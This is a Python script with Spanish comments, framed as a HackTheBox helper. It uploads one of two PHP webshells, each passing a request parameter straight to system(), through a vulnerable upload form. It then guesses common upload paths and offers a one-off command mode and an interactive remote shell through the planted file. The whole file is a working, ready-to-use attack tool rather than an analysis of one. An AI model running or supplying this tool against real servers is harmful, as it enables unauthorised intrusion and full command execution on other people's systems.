#!/usr/bin/env python3
"""
Script para subir una webshell PHP a un servidor vulnerable
Uso típico en HackTheBox
"""

import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Desactivar warnings de SSL
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Configuración
TARGET_URL = "http://TARGET_IP/upload.php"  # Cambiar por la URL correcta
UPLOAD_PARAM = "file"  # Nombre del parámetro del formulario

# Webshell PHP simple
php_webshell = """<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    die;
}
?>"""

# Webshell PHP alternativa más completa
php_webshell_advanced = """<?php
system($_GET['cmd']);
?>"""

def upload_webshell(url, webshell_content, filename="shell.php"):
    """
    Sube la webshell al servidor
    """
    print(f"[*] Intentando subir webshell a: {url}")
    print(f"[*] Nombre del archivo: {filename}")
    
    try:
        # Preparar el archivo para subir
        files = {
            UPLOAD_PARAM: (filename, webshell_content, 'application/x-php')
        }
        
        # Enviar request
        response = requests.post(url, files=files, verify=False, timeout=10)
        
        print(f"[*] Status Code: {response.status_code}")
        print(f"[*] Response Length: {len(response.text)}")
        
        # Mostrar parte de la respuesta
        if len(response.text) > 0:
            print(f"\n[*] Response preview:")
            print("=" * 50)
            print(response.text[:500])
            print("=" * 50)
        
        # Intentar extraer la ruta del archivo subido
        if "upload" in response.text.lower() or "success" in response.text.lower():
            print("\n[+] Posible éxito! Busca la ruta del archivo en la respuesta")
        
        return response
        
    except requests.exceptions.RequestException as e:
        print(f"[-] Error al subir: {e}")
        return None

def test_webshell(base_url, shell_path, cmd="whoami"):
    """
    Prueba si la webshell funciona
    """
    shell_url = f"{base_url}/{shell_path}"
    print(f"\n[*] Probando webshell en: {shell_url}")
    print(f"[*] Comando: {cmd}")
    
    try:
        response = requests.get(
            shell_url,
            params={'cmd': cmd},
            verify=False,
            timeout=10
        )
        
        print(f"[+] Resultado:")
        print("=" * 50)
        print(response.text)
        print("=" * 50)
        
        return response
        
    except requests.exceptions.RequestException as e:
        print(f"[-] Error al ejecutar comando: {e}")
        return None

def interactive_shell(base_url, shell_path):
    """
    Shell interactiva
    """
    shell_url = f"{base_url}/{shell_path}"
    print(f"\n[*] Shell interactiva iniciada")
    print(f"[*] URL: {shell_url}")
    print(f"[*] Escribe 'exit' para salir\n")
    
    while True:
        try:
            cmd = input("$ ")
            if cmd.lower() in ['exit', 'quit']:
                break
            
            if cmd.strip():
                response = requests.get(
                    shell_url,
                    params={'cmd': cmd},
                    verify=False,
                    timeout=10
                )
                print(response.text)
                
        except KeyboardInterrupt:
            print("\n[!] Saliendo...")
            break
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    print("=" * 60)
    print("   Webshell PHP Upload Script - HackTheBox")
    print("=" * 60)
    
    # Ejemplo de uso
    if len(sys.argv) > 1:
        TARGET_URL = sys.argv[1]
    
    print(f"\n[!] IMPORTANTE: Configura TARGET_URL antes de ejecutar")
    print(f"[*] URL actual: {TARGET_URL}")
    print(f"\n[*] Modos disponibles:")
    print("    1. Subir webshell")
    print("    2. Probar webshell")
    print("    3. Shell interactiva")
    
    modo = input("\n[?] Selecciona modo (1/2/3): ").strip()
    
    if modo == "1":
        # Subir webshell
        url = input("[?] URL de upload (enter para usar default): ").strip() or TARGET_URL
        filename = input("[?] Nombre del archivo (default: shell.php): ").strip() or "shell.php"
        
        print("\n[*] Webshells disponibles:")
        print("    1. Simple (system con REQUEST)")
        print("    2. Advanced (system con GET)")
        
        shell_type = input("[?] Tipo (1/2): ").strip()
        webshell = php_webshell if shell_type == "1" else php_webshell_advanced
        
        response = upload_webshell(url, webshell, filename)
        
        if response:
            print("\n[+] Upload completado!")
            print("[*] Intenta acceder a la webshell en las rutas comunes:")
            print("    - /uploads/shell.php")
            print("    - /files/shell.php")
            print("    - /images/shell.php")
            print("    - /tmp/shell.php")
    
    elif modo == "2":
        # Probar webshell
        base = input("[?] URL base (ej: http://target.htb): ").strip()
        path = input("[?] Ruta del shell (ej: uploads/shell.php): ").strip()
        cmd = input("[?] Comando a ejecutar (default: whoami): ").strip() or "whoami"
        
        test_webshell(base, path, cmd)
    
    elif modo == "3":
        # Shell interactiva
        base = input("[?] URL base (ej: http://target.htb): ").strip()
        path = input("[?] Ruta del shell (ej: uploads/shell.php): ").strip()
        
        interactive_shell(base, path)
    
    else:
        print("[-] Modo no válido")
    
    print("\n[*] Fin del script")
